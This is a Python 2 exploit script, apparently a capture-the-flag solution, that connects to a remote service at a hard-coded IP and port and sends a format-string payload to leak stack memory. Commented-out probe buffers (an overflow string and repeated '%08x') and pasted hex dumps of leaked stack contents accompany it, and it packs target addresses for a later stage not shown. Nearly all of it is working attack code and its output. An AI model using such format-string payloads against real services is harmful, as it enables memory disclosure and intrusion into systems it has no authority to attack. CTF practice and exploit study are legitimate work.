from multiprocessing.reduction import recv_handle

__author__ = 'HuyNA'
'''
Description
pwn 54.92.19.227 8212
'''

import sys
import os
import socket
import time
import telnetlib
import struct

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
def print_():
    s1=''
    for i in xrange(1000):
        s1 += s.recv(10)
    print s1

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_host="54.92.19.227"
local_port=8212

s.connect((local_host,local_port))
time.sleep(0.01)

print recv_until(s,'who are U?\n')
#buffer = 'a'*50000+'\n'
#buffer = '%08x'*40+'\n'
time.sleep(0.01)

address1 = struct.pack('<I',0xf7e7b2c0)
address2 = struct.pack('<I',0xffffe660)
buffer1='%x'*6+'%s'
print buffer1
s.send(buffer1)
time.sleep(0.01)
#print_();
print recv_until(s,'bye!')
#006ff2c000000000006ff2c000000000006ff2c00000000affffe660ffffe610f01dc6d500000008f01dc23cffffe5c000000000ffffe710ffffe510f6d82000ffffe66000000000ffffe710ffffe4600000000000000008ffffe5bcffffe5b8ffffe5c0f6da8b900000000100000001ffffe660ffffe770b417190000000002ffffe6600000000100000000ffffe64000000000ffffe770f03efc8bf05fc450
#f7e7b2c000000000f7e7b2c000000000f7e7b2c00000000affffe660ffffe610f01dc6d500000008f01dc23cffffe5c000000000ffffe710ffffe510f6d82000ffffe66000000000ffffe710ffffe4600000000000000008ffffe5bcffffe5b8ffffe5c0f6da8b900000000100000001ffffe660ffffe7709777e80000000002ffffe6600000000100000000ffffe64000000000ffffe770f03efc8bf05fc450
